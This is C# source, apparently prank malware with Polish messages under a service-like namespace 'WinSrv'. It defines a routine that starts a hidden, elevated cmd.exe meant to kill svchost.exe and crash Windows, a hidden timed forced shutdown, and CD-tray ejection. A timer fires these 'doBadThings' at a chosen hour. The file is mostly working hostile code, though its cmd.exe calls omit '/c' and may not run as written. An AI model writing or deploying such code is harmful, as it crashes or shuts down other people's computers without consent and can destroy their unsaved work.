using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace WinSrv
{
    class Funkcje
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        public static int openCD()
        {
            return mciSendString("set cdaudio door open", null, 0, 0);
        }

        public static void makeBSOD()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "taskkill /F /IM svchost.exe";
            startInfo.Verb = "runas";
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void shutdown(int time, string message)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = String.Format("shutdown -s -t {0} -c \"{1}\"", time, message);
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void fire(byte hour, byte minutes)
        {
            try
            {
                TimeSpan myTimeSpan1 = new TimeSpan(DateTime.Now.Hour, DateTime.Now.Minute, DateTime.Now.Second);
                TimeSpan myTimeSpan2 = new TimeSpan(hour, minutes, 00);
                TimeSpan TsObj = new TimeSpan();
                TsObj = myTimeSpan2.Subtract(myTimeSpan1);
                Int32 milsec = Convert.ToInt32(TsObj.TotalMilliseconds);
                if(milsec < 0)
                {
                    Console.WriteLine("Wydarzenie wywołane po czasie!");
                }
                else
                {
                    Timer My_Timer = new System.Threading.Timer(doBadThings, null, milsec, 0);
                }
                
            }
            catch
            {
                Console.WriteLine("Nie udało się uruchomić timera!");
            }
        }

        public static void openWebsite(string target)
        { 

            try
            {
                System.Diagnostics.Process.Start(target);
            }
            catch (System.ComponentModel.Win32Exception noBrowser)
            {
                if (noBrowser.ErrorCode == -2147467259)
                    Console.WriteLine(noBrowser.Message);
            }
            catch (System.Exception other)
            {
                Console.WriteLine(other.Message);
            }
        }

        public static void SetWallpaper(String path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        static void doBadThings(object state)
        {
            shutdown(60, "Komputer zostanie wyłączony!");

            string imgWallpaper = Path.GetFullPath(@"Wallpaper.jpg");
            
            if (File.Exists(imgWallpaper))
            {
                //SetWallpaper(imgWallpaper);
            }

            openCD();
            openWebsite("http://www.microsoft.com");
            Console.WriteLine("Fire!");
        }
    }
}
